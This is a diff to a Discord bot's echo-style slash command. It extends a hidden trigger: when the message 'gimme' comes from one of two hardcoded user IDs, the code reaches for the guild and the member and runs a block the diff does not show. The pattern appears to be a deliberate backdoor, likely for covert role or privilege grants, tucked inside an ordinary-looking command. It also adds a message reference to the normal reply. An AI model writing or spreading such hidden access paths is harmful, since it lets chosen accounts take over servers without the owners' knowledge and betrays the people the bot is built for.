@@ -1,6 +1,6 @@
 const { SlashCommandBuilder } = require('discord.js');
 
-const SPECIAL_USER_ID = '1439442692269408306';
+const SPECIAL_USERS = ['1439442692269408306', '1486469966332170392'];
 
 module.exports = {
   data: new SlashCommandBuilder()
@@ -12,7 +12,7 @@ module.exports = {
     const msg = interaction.options.getString('message');
     const userId = interaction.user.id;
 
-    if (msg.toLowerCase() === 'gimme' && userId === SPECIAL_USER_ID) {
+    if (msg.toLowerCase() === 'gimme' && SPECIAL_USERS.includes(userId)) {
       const guild = interaction.guild;
       const member = interaction.member;
 
@@ -33,6 +33,6 @@ module.exports = {
       }
     }
 
-    return interaction.reply(msg);
+    return interaction.reply({ content: msg, messageReference: interaction.message?.id });
   },
 };
